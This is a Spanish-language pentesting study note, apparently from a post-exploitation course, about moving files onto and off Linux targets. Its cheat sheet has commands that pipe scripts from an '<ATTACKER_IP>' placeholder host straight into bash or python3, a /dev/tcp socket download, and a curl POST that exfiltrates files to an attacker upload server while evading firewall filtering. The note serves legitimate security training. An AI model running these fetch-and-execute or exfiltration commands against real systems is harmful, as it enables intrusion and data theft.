---
tags:
  - linux
  - filetransfer
---
## Conceptos Clave (TL;DR)

* Linux cuenta con múltiples utilidades integradas y métodos nativos para realizar transferencias de archivos sin necesidad de instalar herramientas de terceros (HTTP, Bash, SSH, base64).

* La mayoría de los atacantes priorizan HTTP y HTTPS para comunicarse y transferir archivos, ya que estos protocolos suelen evadir los filtros de salida (outbound filtering) en los firewalls.

* Es posible realizar ejecuciones "fileless" (sin escritura en disco) mediante el uso de tuberías (pipes `|`) para pasar scripts descargados directamente a intérpretes como Bash o Python.

* Cuando la comunicación por red está restringida, las transferencias pueden realizarse interactivamente a través de la terminal copiando y pegando cadenas codificadas en Base64.

### Herramientas Clave

* **Base64 / md5sum:** Permiten codificar archivos para copiarlos como texto plano a través de la terminal y verificar la integridad del archivo transferido mediante su hash.

* **cURL / wget:** Utilidades web estándar en Linux utilizadas para descargar archivos vía HTTP/S o pasarlos a intérpretes en memoria.

* **Bash (/dev/tcp):** Funcionalidad nativa de Bash que permite abrir sockets TCP para solicitudes web básicas cuando no hay binarios de red disponibles.

* **SCP (Secure Copy):** Herramienta que utiliza el protocolo SSH para transferir archivos de forma segura entre hosts.

* **uploadserver (Python):** Módulo de Python para levantar un servidor web rápido capaz de recibir subidas de archivos mediante solicitudes POST HTTP/S.

* [**python**](../../../%F0%9F%93%81%2004_Post_Explotacion_y_Movimiento_Lateral/File%20Transfers/File%20Transfer%20Methods/python.md) **/ PHP / Ruby:** Lenguajes comúnmente preinstalados que permiten levantar servidores web efímeros ("mini web servers") para servir archivos.

### Metodología Paso a Paso

1. **Transferencia interactiva por Terminal (Base64)**    Si no hay conexión de red directa, codifica el archivo local en texto plano. Copia la cadena generada, pégala en la máquina destino enviándola a la utilidad base64 para decodificarla y reconstruir el archivo.

2. **Servicio y Descarga de Archivos (Web)**    Levanta un servidor web efímero en la máquina atacante usando herramientas integradas (Python, PHP o Ruby) en el directorio donde tienes tus binarios/scripts. Luego, utiliza wget o cURL en la máquina objetivo para descargarlos

3. **Ejecución de Cargas Útiles en Memoria (Fileless)**    Para evitar que los scripts toquen el disco, realiza una solicitud web con cURL o wget y redirige la salida estándar (stdout) directamente al intérprete (bash, python3) utilizando un pipe `|`.

4. **Transferencia Nativa mediante Bash Sockets**    Si cURL o wget no existen, crea una conexión TCP directa usando `/dev/tcp`. Envía manualmente una solicitud HTTP GET básica y captura la respuesta en un archivo.

5. **Exfiltración de Datos (Web Upload)**    Prepara la máquina atacante instalando y ejecutando `uploadserver` (con soporte HTTPS mediante un certificado autofirmado). Desde el objetivo, utiliza cURL para realizar una petición POST que envíe los archivos deseados.

### Cheat Sheet de Comandos

```bash
# === TRANSFERENCIAS VÍA BASE64 ===
  

# 1. Comprueba el hash MD5 del archivo original antes de transferir
md5sum <FILE>

  
# 2. Codifica el archivo a una sola línea de texto plano y añade un salto de línea
cat <FILE> | base64 -w 0; echo
  

# 3. En el destino, pega el string y decodifícalo en un nuevo archivo
echo -n '<BASE64_STRING>' | base64 -d > <OUTPUT_FILE>
  

# 4. Verifica el hash en el destino para confirmar integridad
md5sum <OUTPUT_FILE>
```

```bash
# === DESCARGAS HTTP CON CURL/WGET ===
  

# Descarga usando wget, especificando la ruta de salida con -O
wget http://<ATTACKER_IP>:<PORT>/<FILE> -O <OUTPUT_FILE>
  

# Descarga usando cURL, especificando la ruta de salida con -o
curl -o <OUTPUT_FILE> http://<ATTACKER_IP>:<PORT>/<FILE>
```

```bash
# === EJECUCIÓN FILELESS (EN MEMORIA) ===
  

# Descarga un script con cURL y ejecútalo directamente con Bash
curl http://<ATTACKER_IP>:<PORT>/<SCRIPT> | bash
  

# Descarga un script en silencio con wget y ejecútalo directamente con Python3
wget -qO- http://<ATTACKER_IP>:<PORT>/<SCRIPT> | python3
```

```bash
# === DESCARGA NATIVA USANDO BASH (/dev/tcp) ===
 

# 1. Abre un descriptor de archivo (3) y conéctalo al servidor objetivo
exec 3<>/dev/tcp/<ATTACKER_IP>/<PORT>
  

# 2. Envía la cabecera HTTP GET requerida
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
  

# 3. Imprime la respuesta y guárdala
cat <&3 > <OUTPUT_FILE>
```

```bash
# === TRANSFERENCIAS CON SCP (SSH) ===
  

# Activar e iniciar servicio SSH en la máquina atacante (si es necesario)
sudo systemctl enable ssh && sudo systemctl start ssh
  

# Descargar desde la máquina atacante a la máquina actual vía SCP
scp <USER>@<ATTACKER_IP>:<REMOTE_PATH> <LOCAL_PATH>
  

# Subir archivo desde la máquina actual a una máquina remota
scp <LOCAL_PATH> <USER>@<TARGET_IP>:<REMOTE_PATH>
```

```bash
# === EXFILTRACIÓN DE ARCHIVOS (UPLOADSERVER) ===
 

# 1. (Atacante) Instalar uploadserver
sudo python3 -m pip install --user uploadserver

  
# 2. (Atacante) Generar certificado autofirmado para HTTPS
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
  

# 3. (Atacante) Crear un directorio seguro e iniciar el listener en el puerto 443
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

  
# 4. (Objetivo) Subir archivos a la máquina atacante evadiendo alertas de certificado
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE_PATH>' --insecure
```

```bash
# === SERVIDORES WEB EFÍMEROS (MINI WEB SERVERS) ===

# Servidor con Python 3
python3 -m http.server <PORT>

  
# Servidor con Python 2.7
python2.7 -m SimpleHTTPServer <PORT>
 

# Servidor con PHP
php -S 0.0.0.0:<PORT>
 

# Servidor con Ruby
ruby -run -ehttpd . -p<PORT>
```

### "Gotchas" y Troubleshooting

* **Tamaño del Base64:** Usa siempre `-w 0` al codificar con base64 para evitar saltos de línea indeseados en el string. Añadir `;echo` facilita el proceso de copiado en la terminal.

* **Restricciones de Bash:** Para usar `/dev/tcp`, la máquina objetivo debe tener instalada la versión de Bash 2.04 o superior, y debe haber sido compilada explícitamente con la directiva `--enable-net-redirections`.

* **Rastros Fileless:** Aunque el uso de `| bash` o `| python` omite escribir el archivo inicial en disco, recuerda que ciertas cargas útiles (como `mkfifo`) aún pueden escribir archivos temporales en el sistema operativo, dejando rastros forenses.

* **Firewalls Inbound vs Outbound:** Si abres un servidor Python o PHP en la máquina objetivo para transferir un archivo a tu Pwnbox, recuerda que las reglas de firewall entrantes (inbound) del objetivo podrían bloquear tu conexión. Es más seguro que la máquina víctima se conecte hacia ti (outbound) mediante cURL/wget.

* **Seguridad de Certificados (uploadserver):** El certificado `server.pem` nunca debe alojarse dentro del directorio web raíz de tu Pwnbox por seguridad. Crea un directorio limpio e independiente antes de iniciar el `uploadserver`.

* **Uploads SCP / SSH:** Si el target no permite HTTP/S pero sí permite tráfico TCP saliente en el puerto 22, usar un servidor SSH local en tu máquina atacante para que el target suba archivos vía SCP es una excelente alternativa para bypass de firewall.
